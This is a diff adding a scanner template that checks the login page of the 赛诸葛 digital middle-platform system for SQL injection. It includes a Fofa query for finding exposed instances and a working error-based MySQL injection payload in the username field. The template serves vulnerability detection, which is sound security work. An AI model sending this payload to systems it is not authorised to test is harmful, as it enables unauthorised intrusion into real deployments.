@@ -1,0 +1,24 @@
+id: saizhuge-login-sqli
+
+info:
+  name: 赛诸葛数字化智能中台系统 login SQL注入
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    Fofa: body="static/index/image/login_left.png" || icon_hash="1056416905"
+  reference:
+    - https://mp.weixin.qq.com/s/5D76h-wiJpXf_jLlcWCD0w
+  tags: saizhuge,sqli
+  created: 2024/12/31
+
+set:
+  randint: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /login
+      body: username=1')) AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(3469=3469,md5({{randint}})))),0x7e),3469) AND (('fOfY'='fOfY&loginType=1&password=bbb8aae57c104cda40c93843ad5e6db8&phone_head=86&wx_openid=&member=
+    expression: response.status == 500 && response.body.bcontains(b'SQLSTATE') && response.body.bcontains(bytes(md5(string(randint))))
+expression: r0()
